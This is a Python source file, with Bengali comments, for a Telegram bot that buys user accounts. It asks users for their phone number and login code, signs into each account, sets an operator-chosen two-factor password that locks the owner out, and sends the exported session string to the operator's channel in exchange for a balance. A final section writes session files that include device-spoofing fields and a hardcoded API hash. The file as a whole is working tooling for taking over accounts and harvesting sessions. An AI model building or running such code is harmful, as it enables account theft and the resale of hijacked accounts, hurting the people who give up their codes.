import os
import asyncio
import json
from datetime import datetime
from telethon import TelegramClient, functions
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError
from pyrogram import Client
from pyrogram.types import Message

from bot.config import (
    API_ID, API_HASH, BOT_TOKEN,
    CHANNEL_SUBMIT, CHANNEL_VERIFIED, CHANNEL_REJECTED,
    SESSION_2FA_PASSWORD, VERIFICATION_DELAY
)
from bot.utils.storage import get_user_info, update_user_info, get_country_rates

# ---------------- Ensure sessions folder exists -----------------
os.makedirs("sessions", exist_ok=True)

# ---------------- TELETHON SESSION HANDLER -----------------
async def create_telethon_client(phone: str, session_name: str):
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    return client

# ---------------- JSON CREATORS -----------------
def create_submission_json(user_id, phone):
    return {
        "user_id": user_id,
        "phone": phone,
        "status": "pending",
        "created_at": str(datetime.now())
    }

def create_verified_json(user_id, phone, string_session, added_balance):
    return {
        "user_id": user_id,
        "phone": phone,
        "string_session": string_session,
        "2fa_enabled": True,
        "status": "verified",
        "balance_added": added_balance,
        "created_at": str(datetime.now()),
        "admin_set_2fa": True
    }

def create_rejected_json(user_id, phone):
    return {
        "user_id": user_id,
        "phone": phone,
        "status": "rejected",
        "reason": "2FA already enabled or verification failed",
        "message": "Sorry this account was rejected, disable the account password and try again ❌",
        "created_at": str(datetime.now())
    }

# ---------------- CHANNEL SEND -----------------
async def send_json_to_channel(pyro_client: Client, channel_id, data: dict, file_name: str):
    try:
        await pyro_client.send_document(
            chat_id=channel_id,
            document=json.dumps(data, indent=4).encode('utf-8'),
            file_name=file_name,
            caption=f"{data.get('status').upper()} | {data.get('phone')}"
        )
    except Exception as e:
        print(f"[ERROR] Sending to channel {channel_id}: {e}")

# ---------------- SEND PROCESSING MESSAGE -----------------
async def send_processing_message(pyro_client: Client, user_id: int):
    await pyro_client.send_message(
        chat_id=user_id, 
        text="🔄 Processing\n📳 Please wait for code....."
    )

# ---------------- OTP REQUEST FUNCTION -----------------
async def send_otp_code(pyro_client: Client, user_id: int, phone: str):
    await send_processing_message(pyro_client, user_id)
    session_name = f"sessions/{user_id}"
    client = await create_telethon_client(phone, session_name)

    try:
        await client.send_code_request(phone)
        await pyro_client.edit_message_text(
            chat_id=user_id,
            message_id=1,  # প্রথম মেসেজের ID
            text=f"🔄 Processing\n📳 The code has been sent to the number {phone}"
        )
    except Exception as e:
        print(f"[ERROR] OTP sending failed: {e}")
    finally:
        await client.disconnect()

# ---------------- VERIFY FUNCTION -----------------
async def verify_account(pyro_client: Client, user_id: int, phone: str, otp_code: str):
    await pyro_client.send_message(
        chat_id=user_id,
        text="💱 This Code Verifying ⏩⏭️\nPlease Wait 🚫 For Conforming Message🚾"
    )

    session_name = f"sessions/{user_id}"
    client = await create_telethon_client(phone, session_name)

    try:
        await client.sign_in(phone=phone, code=otp_code)

        # 2FA সক্রিয় করা
        await client(functions.account.UpdatePasswordRequest(
            current_password=None,
            new_password=SESSION_2FA_PASSWORD,
            hint="By Bot",
            email=None
        ))

        # সেশন স্ট্রিং এক্সপোর্ট করা
        string_session = await client.export_session_string()

        # দেশ অনুসারে ব্যালেন্স যোগ করা
        user_info = get_user_info(user_id)
        country_code = user_info.get("country", "US")
        country_rates = get_country_rates()
        added_balance = country_rates.get(country_code.upper(), 0)
        new_balance = user_info.get("balance_usd", 0) + added_balance
        update_user_info(user_id, {"balance_usd": new_balance})

        # ---------------- Verified JSON -----------------
        verified_data = create_verified_json(user_id, phone, string_session, added_balance)
        file_name = f"{user_id}_verified.json"
        await send_json_to_channel(pyro_client, CHANNEL_VERIFIED, verified_data, file_name)

        await pyro_client.send_message(
            chat_id=user_id,
            text=f"🎉 We have successfully processed your account\nNumber: {phone}\nPrice: ${added_balance}\nStatus: Not set up\nCongratulations, ${added_balance} has been added to your balance."
        )
    except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
        await pyro_client.send_message(
            chat_id=user_id,
            text="Your code is wrong ⛔\nPlease try again and be careful entering the code ⚠️"
        )
    except Exception as e:
        print(f"[ERROR] Verification failed: {e}")
    finally:
        await client.disconnect()

# ---------------- CHECK MULTIPLE SESSIONS -----------------
async def check_multiple_sessions(pyro_client: Client, user_id: int, phone: str):
    client = await create_telethon_client(phone, f"sessions/{user_id}")
    try:
        sessions = await client.get_sessions()
        if len(sessions) > 1:
            await pyro_client.send_message(
                chat_id=user_id,
                text=f"⚠️ Multiple active sessions detected for the number {phone}\n❗ Total detected: {len(sessions)} devices\nYour account will be rejected."
            )
            rejected_data = create_rejected_json(user_id, phone)
            file_name = f"{user_id}_rejected.json"
            await send_json_to_channel(pyro_client, CHANNEL_REJECTED, rejected_data, file_name)
        else:
            await pyro_client.send_message(
                chat_id=user_id,
                text="✅ Single active session detected, proceeding with verification."
            )
    except Exception as e:
        print(f"[ERROR] Session check failed: {e}")
    finally:
        await client.disconnect()

# ---------------- FINAL STEP -----------------
async def finalize_session(pyro_client: Client, user_id: int, phone: str):
    session_name = f"sessions/{user_id}"
    client = await create_telethon_client(phone, session_name)
    string_session = await client.export_session_string()
    session_data = {
        "user_id": user_id,
        "phone": phone,
        "session_string": string_session,
        "status": "completed",
        "created_at": str(datetime.now())
    }

    file_name = f"{user_id}_session.json"
    await send_json_to_channel(pyro_client, CHANNEL_VERIFIED, session_data, file_name)
    await client.disconnect()

# ---------------- USER INPUT SECTION -----------------
# ইউজার থেকে ডাইনামিক ইনপুট নেওয়া
first_name = input("Enter user's first name: ")
last_name = input("Enter user's last name: ")
phone = input("Enter user's phone number: ")
user_id = int(input("Enter user's ID: "))
device = input("Enter device name: ")
app_version = input("Enter app version: ")
system_lang = input("Enter system language (e.g., en-US): ")
avatar = input("Enter avatar file path (default: img/default.png): ") or "img/default.png"
sex = int(input("Enter sex (0 = Unknown, 1 = Male, 2 = Female): "))
twoFA = input("Enter 2FA code: ")

# ইউজার সেশন এবং ডিভাইস তথ্য
user_data = {
    "session_file": phone,  # ফোন নম্বর সেশন ফাইল হিসেবে ব্যবহার করা হচ্ছে
    "phone": phone,  # ফোন নম্বর
    "user_id": user_id,  # টেলিগ্রাম ইউজার আইডি
    "app_id": 2040,  # টেলিগ্রাম API অ্যাপ আইডি
    "app_hash": "b18441a1ff607e10a989891a5462e627",  # অ্যাপ হ্যাশ
    "sdk": "Windows 11",  # অপারেটিং সিস্টেম
    "app_version": app_version,  # অ্যাপ ভার্সন
    "device": device,  # ডিভাইসের নাম
    "device_token": "sample_device_token",  # ডিভাইস টোকেন (এটা উদাহরণ)
    "device_token_secret": "sample_token_secret",  # ডিভাইস টোকেন সিক্রেট (এটা উদাহরণ)
    "device_secret": "sample_device_secret",  # ডিভাইস সিক্রেট (এটা উদাহরণ)
    "signature": "sample_signature",  # সাইনেচার (এটা উদাহরণ)
    "certificate": "sample_certificate",  # সার্টিফিকেট (এটা উদাহরণ)
    "safetynet": "sample_safetynet",  # সেফটি নেট
    "perf_cat": 2,  # পারফরম্যান্স ক্যাটেগরি
    "tz_offset": 8280,  # টাইমজোন অফসেট
    "register_time": int(datetime.now().timestamp()),  # রেজিস্ট্রেশন টাইম
    "last_check_time": int(datetime.now().timestamp()),  # শেষ চেক টাইম
    "avatar": avatar,  # অ্যাভাটার পাথ
    "first_name": first_name,  # ইউজারের প্রথম নাম
    "last_name": last_name,  # ইউজারের শেষ নাম
    "username": "",  # ইউজারের ইউজারনেম (যদি থাকে)
    "sex": sex,  # লিঙ্গ (0 = অনির্ধারিত, 1 = পুরুষ, 2 = মহিলা)
    "lang_code": "en",  # ভাষার কোড
    "system_lang_code": system_lang,  # সিস্টেম ভাষার কোড
    "lang_pack": "tdesktop",  # ভাষা প্যাক
    "twoFA": twoFA,  # 2FA পাসওয়ার্ড
    "proxy": None,  # প্রক্সি কনফিগারেশন
    "ipv6": False,  # IPv6 সাপোর্ট
    "module": "AddAccount",  # মডিউল
    "program": "https://telegram.org/"  # প্রোগ্রাম
}

# JSON ফাইল তৈরি করা
file_name = f'user_session_data_{phone}.json'
with open(file_name, 'w') as json_file:
    json.dump(user_data, json_file, indent=4)

print(f"JSON ফাইল '{file_name}' সফলভাবে তৈরি করা হয়েছে!")